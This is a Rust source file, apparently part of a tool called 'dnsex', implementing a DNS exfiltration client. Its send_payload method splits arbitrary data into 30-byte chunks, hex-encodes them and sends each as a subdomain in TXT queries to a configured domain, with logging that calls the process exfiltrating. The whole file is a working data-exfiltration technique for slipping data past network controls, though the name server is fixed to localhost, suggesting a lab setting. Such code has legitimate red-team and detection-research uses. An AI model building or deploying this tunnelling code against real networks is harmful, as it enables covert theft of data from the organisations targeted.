use crate::error::DnsexError;
use hickory_client::client::{AsyncClient, ClientHandle};
use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
use hickory_proto::udp::UdpClientStream;
use std::net::SocketAddr;
use std::str::FromStr;
use tokio::net::UdpSocket as TokioUdpSocket;
use tokio::time::{Duration, sleep};

pub struct Client {
    domain: String,
    port: u16,
}

impl Client {
    pub fn new(domain: impl Into<String>, port: u16) -> Self {
        Self {
            domain: domain.into(),
            port,
        }
    }

    pub async fn send_payload(&self, payload: &[u8]) -> Result<(), DnsexError> {
        let name_server: SocketAddr = format!("127.0.0.1:{}", self.port).parse().unwrap();
        let stream = UdpClientStream::<TokioUdpSocket>::new(name_server);
        let client_connect_future = AsyncClient::connect(stream);

        let (mut client, background_task) = client_connect_future.await?;
        tokio::spawn(background_task);

        let chunk_size = 30;
        let chunks = payload.chunks(chunk_size);
        let total_chunks = chunks.len();

        println!("exfiltrating of {} chunks to {}", total_chunks, self.domain);

        for (seq, chunk) in chunks.enumerate() {
            let hex_data = hex::encode(chunk);
            let fqdn = format!("{}.{}.{}", hex_data, seq, self.domain);
            let domain_name = Name::from_str(&fqdn)?;

            println!("Sending chunk {}/{}: {}", seq + 1, total_chunks, fqdn);

            let response = client
                .query(domain_name, DNSClass::IN, RecordType::TXT)
                .await?;

            if response.answers().is_empty() {
                println!("Response code: {}", response.response_code());
            } else {
                for answer in response.answers() {
                    if let Some(RData::TXT(txt)) = answer.data() {
                        println!("{}", txt);
                    }
                }
            }

            sleep(Duration::from_millis(100)).await;
        }

        Ok(())
    }
}
